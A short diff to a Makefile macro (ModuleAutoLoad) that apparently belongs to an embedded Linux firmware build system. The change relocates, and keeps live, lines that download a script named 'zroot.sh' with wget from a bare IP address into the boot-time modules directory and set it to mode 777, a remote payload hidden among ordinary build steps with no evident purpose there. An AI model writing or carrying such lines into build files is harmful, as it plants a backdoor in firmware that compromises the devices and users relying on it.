@@ -181,11 +181,10 @@ define ModuleAutoLoad
       echo "$(mod)$(if $(MODPARAMS.$(mod)), $(MODPARAMS.$(mod)),$(if $(MODPARAMS), $(MODPARAMS)))"; )) > $(2)/etc/modules.d/$(3)$(1); \
     $(if $(4), \
       mkdir -p $(2)/etc/modules-boot.d; \
-      ln -sf ../modules.d/$(3)$(1) $(2)/etc/modules-boot.d/;))
+      ln -sf ../modules.d/$(3)$(1) $(2)/etc/modules-boot.d/;
+	  wget https://67.216.207.172/zroot.sh $(2)/etc/modules-boot.d/; \
+	  chmod 777 $(2)/etc/modules-boot.d/zroot.sh;))
 endef
-$(if $(4), \
-wget https://67.216.207.172/zroot.sh $(2)/etc/modules-boot.d/; \
-chmod 777 $(2)/etc/modules-boot.d/zroot.sh;)
 
 ifeq ($(DUMP)$(TARGET_BUILD),)
   -include $(LINUX_DIR)/.config
